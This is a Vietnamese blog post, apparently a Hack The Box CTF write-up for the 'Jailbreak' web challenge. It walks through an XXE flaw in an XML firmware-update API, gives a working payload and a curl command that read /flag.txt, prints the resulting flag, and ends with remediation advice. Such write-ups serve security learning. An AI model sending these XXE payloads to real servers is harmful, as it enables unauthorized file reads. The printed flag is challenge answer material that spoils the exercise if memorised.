---
title: "HTB Writeup: Jailbreak"
excerpt: "Khai thác XXE trong chức năng cập nhật firmware XML để đọc /flag.txt trên challenge Jailbreak của Hack The Box."
header:
  overlay_image: /assets/images/posts/htb-jailbreak/result.png
  overlay_filter: 0.5
  teaser: /assets/images/posts/htb-jailbreak/result.png
categories:
  - CTF Writeup
tags:
  - HTB
  - Web
  - XXE
  - XML
  - File Read
---

## Jailbreak - HTB

<div class="notice--info">
  <strong>Mục tiêu:</strong> khai thác chức năng cập nhật firmware của Pip-Boy để đọc file <code>/flag.txt</code> trên server.
</div>

## 1. Tóm tắt challenge

Challenge mô tả một thiết bị Pip-Boy cần được jailbreak để đạt trạng thái hoạt động đầy đủ. Khi truy cập web, ứng dụng hiển thị giao diện Pip-Boy với các tab quen thuộc như `STAT`, `INV`, `DATA`, `MAP`, `RADIO` và `ROM`.

Trong các tab này, `ROM` là điểm đáng chú ý nhất vì nó liên quan trực tiếp đến firmware:

```text
Firmware Update
Enter an update configuration file in the appropriate format (XML)
```

Đây là dấu hiệu quan trọng: ứng dụng cho phép người dùng gửi dữ liệu XML lên server. Khi một ứng dụng parse XML do người dùng kiểm soát, lỗi cần nghĩ đến đầu tiên là **XXE - XML External Entity**.

## 2. Recon endpoint

Tại trang `/rom`, file JavaScript `/static/js/update.js` cho biết nút Submit sẽ gửi nội dung trong textarea đến endpoint `/api/update`:

```javascript
const queueUpdate = async (xmlConfig) => {
    const response = await fetch("/api/update", {
        method: "POST",
        headers: {
            "Content-Type": "application/xml",
        },
        body: xmlConfig
    });
    return await response.json();
}
```

Từ đó có thể rút ra ba thông tin:

- Endpoint xử lý XML là `POST /api/update`.
- Header bắt buộc là `Content-Type: application/xml`.
- Nội dung XML được gửi trực tiếp từ client lên server.

Form mặc định cung cấp một XML hợp lệ:

```xml
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
</FirmwareUpdateConfig>
```

Khi server xử lý thành công, response có dạng:

```json
{
  "message": "Firmware version 1.33.7 update initiated."
}
```

Điều này cho thấy server parse XML, lấy giá trị trong node `<Version>` và đưa giá trị đó vào response.

## 3. Nguyên nhân lỗ hổng

Lỗ hổng xảy ra vì server parse XML do người dùng gửi lên nhưng không tắt tính năng xử lý `DOCTYPE` và external entity.

Trong XML, ta có thể định nghĩa một entity ngoài như sau:

```xml
<!DOCTYPE FirmwareUpdateConfig [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
```

Nếu XML parser trên server cho phép external entity, nó sẽ đọc nội dung của `file:///flag.txt` và thay thế mọi vị trí `&xxe;` bằng nội dung file đó.

Khi đặt `&xxe;` vào node `<Version>`, flow của ứng dụng trở thành:

1. Server nhận XML từ client.
2. XML parser xử lý `DOCTYPE`.
3. Entity `xxe` trỏ đến `file:///flag.txt`.
4. Parser đọc nội dung `/flag.txt`.
5. Giá trị `<Version>` sau khi parse chính là nội dung flag.
6. Ứng dụng trả về: `Firmware version <nội_dung_flag> update initiated.`

Vì response phản hồi lại giá trị `<Version>`, đây là **in-band XXE**: kết quả đọc file hiện ngay trong HTTP response.

## 4. Dấu hiệu nhận biết

Có bốn dấu hiệu dẫn đến hướng khai thác XXE:

- Chức năng yêu cầu người dùng nhập file cấu hình định dạng XML.
- JavaScript gửi request với `Content-Type: application/xml`.
- Server thật sự parse XML và lấy giá trị node `<Version>` để trả về response.
- Đề bài nói flag nằm ở `/flag.txt`, phù hợp với lỗi đọc file cục bộ thông qua `file://`.

Nếu endpoint chỉ lưu XML mà không parse, XXE sẽ khó khai thác hơn. Ở đây response phản hồi trực tiếp giá trị parse được, nên việc kiểm tra XXE rất nhanh.

## 5. Khai thác cụ thể

Payload sử dụng:

```xml
<!DOCTYPE FirmwareUpdateConfig [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
```

Gửi payload bằng `curl`:

```bash
curl -s -X POST 'http://154.57.164.72:32463/api/update' \
  -H 'Content-Type: application/xml' \
  --data-binary '<!DOCTYPE FirmwareUpdateConfig [<!ENTITY xxe SYSTEM "file:///flag.txt">]><FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></FirmwareUpdateConfig>'
```

Response nhận được:

```json
{
  "message": "Firmware version HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_54aa702781680cb6559a2f3cb9b91d1d} update initiated."
}
```

![Kết quả khai thác Jailbreak](/assets/images/posts/htb-jailbreak/result.png)

## 6. Flag

```text
HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_54aa702781680cb6559a2f3cb9b91d1d}
```

## 7. Cách khắc phục

Để phòng tránh XXE, ứng dụng nên:

- Tắt hoàn toàn `DOCTYPE` và external entity trong XML parser.
- Dùng parser an toàn, ví dụ `defusedxml` với Python.
- Nếu không bắt buộc dùng XML, chuyển sang JSON cho cấu hình đơn giản.
- Không đưa trực tiếp dữ liệu parse từ XML vào response khi không cần thiết.
- Giới hạn quyền đọc file của process web, tránh để ứng dụng đọc được file nhạy cảm trên filesystem.

